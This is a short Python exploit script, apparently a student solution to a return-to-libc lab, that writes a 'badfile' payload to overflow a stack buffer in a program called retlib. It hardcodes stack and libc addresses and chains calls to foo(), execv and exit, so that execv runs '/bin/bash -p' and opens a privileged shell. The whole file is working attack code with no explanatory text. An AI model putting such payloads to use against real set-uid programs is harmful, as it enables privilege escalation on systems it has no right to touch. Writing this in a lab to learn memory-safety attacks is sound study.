#!/usr/bin/env python3
import sys

base_addr = 0xffffcdc0 # Base address printed by ./retlib
ADJUST = 48 # Keep adjustment found via brute-force
buff_addr = base_addr + ADJUST

foo_addr = 0x565562b0
execv_addr = 0xf7e994b0
exit_addr = 0xf7e04f80

# --- Offsets ---
Y = 28                 # Distance to Return Address
bash_offset = 100      # Location for "/bin/bash" string
flag_offset = 120      # Location for "-p" string
argv_offset = 144      # Location for argv[] array

# --- Calculated Addresses ---
bash_loc = buff_addr + bash_offset
flag_loc = buff_addr + flag_offset
argv_loc = buff_addr + argv_offset

# --- Payload Construction ---
content = bytearray(0xaa for i in range(300))

# 1. Stack Frame
# Write foo() address 10 times
current_offset = Y
for i in range(10):
    content[current_offset : current_offset+4] = (foo_addr).to_bytes(4, byteorder='little')
    current_offset += 4

# After foo(), the call to execv()
content[current_offset : current_offset+4] = (execv_addr).to_bytes(4, byteorder='little')
current_offset += 4

# exit address
content[current_offset : current_offset+4] = (exit_addr).to_bytes(4, byteorder='little')
current_offset += 4

# First arg (&"/bin/bash")
content[current_offset : current_offset+4] = (bash_loc).to_bytes(4, byteorder='little')
current_offset += 4

# Second arg (&argv[])
content[current_offset : current_offset+4] = (argv_loc).to_bytes(4, byteorder='little')

# 2. Inject Strings into Buffer
content[bash_offset:bash_offset+10] = b"/bin/bash\0"
content[flag_offset:flag_offset+3] = b"-p\0"

# 3. Construct argv[] Array in Buffer
# Array Content: { &"/bin/bash", &"-p", NULL }
content[argv_offset:argv_offset+4] = (bash_loc).to_bytes(4, byteorder='little')
content[argv_offset+4:argv_offset+8] = (flag_loc).to_bytes(4, byteorder='little')
content[argv_offset+8:argv_offset+12] = (0).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)